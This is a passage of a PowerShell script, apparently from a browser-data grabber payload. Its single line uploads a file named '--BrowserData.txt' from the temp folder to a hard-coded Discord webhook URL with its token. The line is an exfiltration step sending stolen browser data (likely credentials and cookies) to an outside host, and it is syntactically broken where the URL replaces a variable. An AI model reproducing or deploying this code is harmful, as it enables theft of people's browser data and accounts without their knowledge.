...
if (-not ([string]::IsNullOrEmpty(https://discordapp.com/api/webhooks/1073990210255335544/nY9gL-V-wqTMADAofv3buh8IbGh-KC3AUiDjOTJFgl_uW7T9sI-GgaqU1sPMjUTKMY9i))){Upload-Discord -file $env:TMP\--BrowserData.txt}
